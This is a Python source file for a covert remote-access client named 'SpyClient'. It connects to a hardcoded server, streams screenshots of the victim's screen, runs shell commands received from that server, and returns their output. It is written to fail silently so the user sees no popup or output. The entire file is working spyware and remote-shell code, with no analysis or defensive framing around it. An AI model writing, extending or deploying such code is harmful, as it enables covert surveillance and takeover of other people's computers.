import socket
import struct
import threading
import time
import mss
import cv2
import numpy as np
import platform
import subprocess
import base64

HOST = '192.168.87.155'  # Your server IP here
PORT = 9999

HEADER_LEN = 4

FRAME_WIDTH = 1280
FRAME_HEIGHT = 720
JPEG_QUALITY = 80
FPS = 60  # 60 frames per second

def send_raw_msg(sock, msg):
    length = struct.pack('!I', len(msg))
    sock.sendall(length + msg)

def recv_all(sock, length):
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data

class SpyClient:
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        self.running = True

    def send_msg(self, header, payload):
        try:
            send_raw_msg(self.sock, header + payload)
        except Exception:
            self.running = False

    def video_sender(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            frame_interval = 1 / FPS
            while self.running:
                start = time.time()
                img = np.array(sct.grab(monitor))
                img = cv2.resize(img, (FRAME_WIDTH, FRAME_HEIGHT))
                _, jpg = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), JPEG_QUALITY])
                self.send_msg(b'VID0', jpg.tobytes())
                elapsed = time.time() - start
                sleep_time = frame_interval - elapsed
                if sleep_time > 0:
                    time.sleep(sleep_time)

    def command_listener(self):
        while self.running:
            length_data = recv_all(self.sock, HEADER_LEN)
            if not length_data:
                self.running = False
                break
            msg_len = struct.unpack('!I', length_data)[0]
            msg = recv_all(self.sock, msg_len)
            if not msg:
                self.running = False
                break
            header = msg[:4]
            content = msg[4:]
            if header == b'CMD0':
                self.handle_command(content)

    def handle_command(self, content):
        try:
            decoded = base64.b64decode(content).decode(errors='ignore').strip()
        except Exception:
            decoded = content.decode(errors='ignore').strip()

        if decoded == "hostname":
            hostname = platform.node()
            self.send_response(f"Hostname: {hostname}")
        else:
            try:
                completed = subprocess.run(decoded, shell=True, capture_output=True, text=True, timeout=15)
                output = completed.stdout + completed.stderr
                if not output.strip():
                    output = "(No output)"
                self.send_response(output)
            except Exception as e:
                self.send_response(f"Command failed: {e}")

    def send_response(self, text):
        try:
            encoded = base64.b64encode(text.encode())
            self.send_msg(b'RSP0', encoded)
        except Exception:
            self.running = False

    def run(self):
        threading.Thread(target=self.video_sender, daemon=True).start()
        threading.Thread(target=self.command_listener, daemon=True).start()
        while self.running:
            time.sleep(0.1)

if __name__ == "__main__":
    try:
        client = SpyClient(HOST, PORT)
        client.run()
    except Exception:
        pass  # Fail silently, no popup or output
